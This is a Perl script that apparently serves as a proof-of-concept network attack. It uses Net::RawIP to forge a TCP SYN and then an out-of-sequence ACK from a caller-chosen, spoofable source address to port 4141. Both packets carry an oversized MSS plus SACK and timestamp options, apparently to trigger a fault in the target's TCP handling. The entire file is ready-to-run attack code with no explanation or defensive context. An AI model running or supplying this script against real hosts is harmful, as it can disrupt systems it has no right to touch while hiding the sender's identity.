#!/usr/bin/env perl

use warnings;
use strict;
use Net::RawIP;
use Time::localtime;

my $src = $ARGV[0] or &usage();
my $dst = $ARGV[1] or &usage();
my $sp  = int(rand(6000)) + 1024;
my $dp  = 4141;
my $mss = pack('n', 16396);
my $seq = 0;


print "[+] will connect from $src:$sp to $dst:$dp\n";
print "[+] building SYN packet...\n";
my $syn_pkt = Net::RawIP->new({
                            ip => {
                                saddr   => $src,
                                daddr   => $dst
                            },
                            tcp => {
                                source  => $sp,
                                dest    => $dp,
                                seq     => $seq,
                                syn     => 1,
                                window  => 32792, 
                            }
                        });

$syn_pkt->optset(
                tcp => {
                    type => [ 2, 4, 8 ],	# set MSS, SACK, and TSV
                    data => [ $mss, '', pack('NN', (localtime(), 0)) ],
                }
);

print "[+] building ACK packet...\n";
my $ack_pkt = Net::RawIP->new({
                            ip => {
                                saddr   => $src,
                                daddr   => $dst
                            },
                            tcp => {
                                source  => $sp,
                                dest    => $dp,
                                seq     => $seq + 2,
                                ack     => 1,
                                window  => 32792,
                            }
});
$ack_pkt->optset(
                tcp => {
                    type => [2, 4, 8],
                    data => [ $mss, '', pack('NN', (localtime(), 0))]
                }
);

print "[+] sending SYN...\n";
$syn_pkt->send( );

print "[+] sending ACK...\n";
$ack_pkt->send(0.1);
print "[+] finished!\n";
exit 0;

sub usage( ) {
	die "usage: $0 <src> <dst>\n";
}


